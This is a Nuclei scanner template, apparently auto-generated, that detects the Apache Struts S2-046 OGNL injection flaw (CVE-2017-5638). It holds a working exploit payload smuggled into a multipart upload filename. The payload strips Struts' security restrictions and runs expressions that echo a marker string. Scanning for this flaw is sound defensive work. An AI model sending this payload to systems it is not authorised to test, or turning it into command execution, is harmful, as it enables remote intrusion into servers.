id: apache-struts2-s2-046
info:
  name: Apache Struts S2-046 OGNL Expression Injection (CVE-2017-5638)
  author: ProjectDiscoveryAI
  severity: critical
  tags: struts, cve, injection, ognl
  description: |
    Apache Struts S2-046 OGNL expression injection vulnerability allows remote attackers to execute arbitrary OGNL expressions.
  reference: []
variables:
  payload: |
    -----------------------------\r\nContent-Disposition: form-data; name="test"; filename="%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#req=@org.apache.struts2.ServletActionContext@getRequest()).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.setContentType('text/html;charset=UTF-8')).(#res.getWriter().print('struts2_security_')).(#res.getWriter().print('check')).(#res.getWriter().flush()).(#res.getWriter().close())}\x00b"\r\nContent-Type: text/plain\r\n\r\n\r\n-----------------------------
http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=---------------------------

        {{payload}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "struts2_security_check"
